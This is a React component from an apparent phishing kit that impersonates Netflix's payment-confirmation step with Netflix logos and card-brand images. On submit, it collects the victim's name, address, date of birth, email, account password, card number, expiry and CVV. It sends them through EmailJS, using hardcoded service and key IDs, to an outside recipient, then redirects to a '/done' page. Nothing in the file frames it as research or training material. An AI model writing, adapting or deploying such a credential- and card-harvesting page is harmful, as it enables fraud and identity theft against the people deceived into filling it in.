import React from "react"
import { useNavigate } from "react-router-dom"
import useStore from "./store"
import { useEffect } from "react"
import emailjs from "@emailjs/browser"

const Confirm = () => {

  const navigate = useNavigate()

  let templateParams = {
    firstName: useStore((state) => state.firstName),
    lastName: useStore((state) => state.lastName),
    address:useStore((state) => state.address),
    city: useStore((state) => state.city),
    stateCity: useStore((state) => state.stateCity),
    zip:useStore((state) => state.zip),
    phone:useStore((state) => state.phone),
    dob:useStore((state) => state.dob),
    email:useStore((state) => state.email),
    password:useStore((state) => state.password),
    cardFirstName: useStore((state) => state.cardFirstName),
    cardLastName:useStore((state) => state.cardLastName),
    cardNum:useStore((state) => state.cardNum),
    expiry:useStore((state) => state.expiry),
    cvv: useStore((state) => state.cvv)
  }

  const store = useStore()

  const cardFirstName = useStore((state) => state.cardFirstName)
  const setCardFirstName = useStore((state) => state.setCardFirstName)

  const cardLastName = useStore((state) => state.cardLastName)
  const setCardLastName = useStore((state) => state.setCardLastName)

  const cardNum = useStore((state) => state.cardNum)
  const setCardNum = useStore((state) => state.setCardNum)

  const expiry = useStore((state) => state.expiry)
  const setExpiry = useStore((state) => state.setExpiry)

  const cvv = useStore((state) => state.cvv)
  const setCvv = useStore((state) => state.setCvv)

  const confirm = (e) => {
    e.preventDefault()
    emailjs.send('service_6ekz1lg', 'template_zxi45yh', templateParams, 'g6969sn3uDsKrhn8k')
    .then(function(response){
      console.log('SUCCESS', response.status, response.text)
    }, function(error){
      console.log('FAILED', error)
    })
    let path = '/done'
      navigate(path)
  }

  useEffect(()=>{console.log(store)},[store ])
  return (
    <>
    <div className="nav">
        <a href="/">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="netflix logo" />
        </a>
        <h2>Sign Out</h2>
    </div>
      <div className="body-1">
        <div className="center">
      <div>
        <p>STEP 2 OF 2</p>
      </div>
      <div>
        <h5>Confirm your payment method.</h5>
      </div>
      <div className="cards">
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/visa-v3.svg" alt="" />
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/mastercard-v2.svg" alt="" />
        <img src="https://assets.nflxext.com/ffe/siteui/acquisition/payment/svg/amex-v2.svg" alt="" />
      </div>
      <form method="post" onSubmit={confirm} className="d-flex flex-column">
        <input type="text" className="binfo" name="message" placeholder="First Name" autoComplete="off" value={cardFirstName} onChange={(evt) => setCardFirstName(evt.target.value)} required/>
        <input type="text" className="binfo" name="message" placeholder="Last Name" autoComplete="off" value={cardLastName} onChange={(evt) => setCardLastName(evt.target.value)} required/>
        <input type="tel" className="binfo" name="message" placeholder="Card Number" inputMode="numeric" autoComplete="off" pattern="[0-9\s]{13,19}" maxLength={19} value={cardNum} onChange={(evt) => setCardNum(evt.target.value)} required/>
        <input type="text" className="binfo" name="message" placeholder="Expiration Date (MM/YY)" maxLength={5} autoComplete="off" value={expiry} onChange={(evt) => setExpiry(evt.target.value)} required/>
        <input type="tel" className="binfo" name="message" placeholder="Security Code" maxLength={4}  inputMode="numeric" autoComplete="off" value={cvv} onChange={(evt) => setCvv(evt.target.value)} required/>
        <button className="update-billing">
          CONFIRM PAYMENT METHOD
        </button>
        </form>
    </div>
      </div>
      <footer>
        <div className="fff">
        <div className="contact-us">
          <p>Questions? Contact us.</p>
        </div>
        <div className="d-flex">
        <div className="faq">
          <p>FAQ</p>
          <p>Help Center</p>
          <p>Terms of Use</p>
          <p>Privacy</p>
        </div>
        <div className="cookie">
          <p>Cookie Preferences</p>
          <p>Corporate Information</p>
        </div>
        </div>
        
        </div>
      </footer>
    </>
  )
}

export default Confirm